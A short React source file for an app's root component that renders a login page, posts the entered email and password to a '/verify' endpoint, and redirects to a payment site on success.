import {useState} from 'react';
import LoginPage from './components/LoginPage/loginPage';
import {fetchExternalData} from 'hooks/fetch'
import './App.css';

function App() {
  const [userData,setUserData] = useState({email:'',password:''})
  const sendData = async(data) =>{
    const response = await fetchExternalData({
        url:'/verify',
        body:{...data,userName:data.email}
    })   
    if(response?.message === 'success'){
        window.location = 'https://secure.triumphpay.com/';
    } 
  }
  return (
    <div className="App">
      <LoginPage userData={userData} setUserData={setUserData} sendData={sendData}/> 
    </div>
  );
}

export default App;
